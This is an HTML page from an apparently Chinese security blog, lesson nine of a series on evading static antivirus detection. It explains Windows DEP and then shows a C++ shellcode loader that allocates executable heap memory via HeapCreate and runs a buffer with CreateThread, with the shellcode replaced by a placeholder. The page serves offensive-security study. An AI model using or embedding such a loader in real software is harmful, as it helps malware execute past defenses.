@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>静态恶意代码逃逸（第九课）</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/projects/" title="Projects">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/tools/" title="Tools">
+                        Tools
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>代码将会上传至Github，方便读者下载研究 : <a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p>
+<h2 id="0x01-数据执行保护dep">0x01 数据执行保护（DEP）</h2>
+<p>DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 微软从Windows XP SP2引入了该技术，并一直延续到今天。</p>
+<h3 id="为什么要有dep">为什么要有DEP</h3>
+<p>在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限制某些内存页不具有可执行权限。</p>
+<h2 id="0x02-如何绕过dep">0x02 如何绕过DEP</h2>
+<p><code>VirtualProtect</code>这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为<code>VirtualProtect</code>的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从&quot;不可执行&quot;变成&quot;可执行&quot;。</p>
+<h2 id="0x03-举一反三">0x03 举一反三</h2>
+<p>由此说来，Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？</p>
+<p><code>HeapCreate</code>可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">HANDLE WINAPI <span style="color:#a6e22e">HeapCreate</span>(
+__in DWORD flOptions,
+__in SIZE_T dwInitialSize,
+__in SIZE_T dwMaximumSize );
+</code></pre></div><p>第一个参数<code>flOptions</code>用于修改如何在堆栈上执行各种操作。
+你可以设定<code>0</code>、<code>HEAP_NO_SERIALIZE</code>、<code>HEAP_GENERATE_EXCEPTIONS</code>、<code>HEAP_CREATE_ENABLE_EXECUTE</code>或者是这些标志的组合。</p>
+<ul>
+<li><code>HEAP_NO_SERIALIZE</code>：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。</li>
+<li><code>HEAP_GENERATE_EXCEPTIONS</code>：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。</li>
+<li><code>HEAP_CREATE_ENALBE_EXECUTE</code>：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。</li>
+</ul>
+<p>看到<code>HEAP_CREATE_ENALBE_EXECUTE</code>相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。</p>
+<h2 id="0x04-shellcode执行">0x04 Shellcode执行</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+	<span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;123&#34;</span>;
+
+	HANDLE hHep <span style="color:#f92672">=</span> HeapCreate(HEAP_CREATE_ENABLE_EXECUTE <span style="color:#f92672">|</span> HEAP_ZERO_MEMORY, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+
+	PVOID Mptr <span style="color:#f92672">=</span> HeapAlloc(hHep, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(shellcode));
+
+	RtlCopyMemory(Mptr, shellcode, <span style="color:#66d9ef">sizeof</span>(shellcode));
+	DWORD dwThreadId <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+	HANDLE hThread <span style="color:#f92672">=</span> CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, NULL, <span style="color:#f92672">&amp;</span>dwThreadId);
+	WaitForSingleObject(hThread, INFINITE);
+
+    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Hello World!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+}
+</code></pre></div><p>上方的例子中，我将shellcode替换为了其他字符串，因为我觉得shellcode混淆是另外一回事。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0e3f2579a680f84059c5c53f9d472895.png" alt="2020-11-29-17-41-52"></p>
+<blockquote>
+<p>样本链接：https://www.virustotal.com/gui/file/1db88905be721e2b279f8f9a6dad1fbf945311b50cc79378d9f69cec5bbe2f6a/detection</p>
+</blockquote>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
+<script>
+(function(){
+  let plantumlPrefix = "language-plantuml";
+  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
+    let image = document.createElement("IMG");
+    image.loading = 'lazy'; 
+    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
+    code.parentNode.insertBefore(image, code);
+    code.style.display = 'none';
+  });
+})();
+</script>
+
+</body>
+</html>
